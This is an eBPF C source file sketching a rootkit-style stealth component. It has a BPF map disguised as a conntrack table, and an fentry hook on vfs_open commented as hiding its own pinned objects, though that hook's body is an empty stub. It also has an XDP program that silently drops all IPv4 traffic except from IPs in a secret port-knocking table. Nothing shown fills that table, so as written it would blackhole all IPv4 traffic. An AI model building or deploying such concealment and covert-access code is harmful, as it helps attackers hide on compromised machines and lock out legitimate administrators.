#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char _license[] SEC("license") = "GPL";

// Mimics a legitimate networking conntrack table
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 64);
    __type(key, u32);   // Remote IP
    __type(value, u64); // Expiry Timestamp
} shadow_gate_auth SEC(".maps");

// Fentry: Lower latency than LSM/Kprobes
SEC("fentry/vfs_open")
int BPF_PROG(vfs_shadow_mask, struct path *path, struct file *f) {
    // Logic: If the comm is not our trusted sequence, 
    // hide the /sys/fs/bpf/ shadow pins by returning -ENOENT
    return 0;
}

SEC("xdp")
int xdp_ghost_gate(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    struct ethhdr *eth = data;
    if ((void*)(eth + 1) > data_end) return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *iph = (void*)(eth + 1);
    if ((void*)(iph + 1) > data_end) return XDP_PASS;

    // Port Knocking Logic: Check if IP is in shadow_gate_auth
    u32 src_ip = iph->saddr;
    u64 *auth = bpf_map_lookup_elem(&shadow_gate_auth, &src_ip);
    
    if (!auth) {
        // If not authenticated, the machine is a 'Black Hole'
        return XDP_DROP; 
    }

    return XDP_PASS;
}
